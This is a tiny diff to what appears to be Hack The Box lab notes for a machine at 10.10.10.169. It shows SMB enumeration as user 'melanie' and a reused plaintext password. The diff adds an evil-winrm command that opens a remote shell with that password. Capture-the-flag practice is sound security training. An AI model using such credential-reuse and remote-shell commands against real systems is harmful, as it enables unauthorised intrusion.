@@ -14,6 +14,8 @@ queryuser 0x457
 smbclient -U melanie -L //10.10.10.169/
 password reuse
 smbclient -U melanie //10.10.10.169/NETLOGON Welcome123!
+
+evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
 ```
 
 HTB writeups
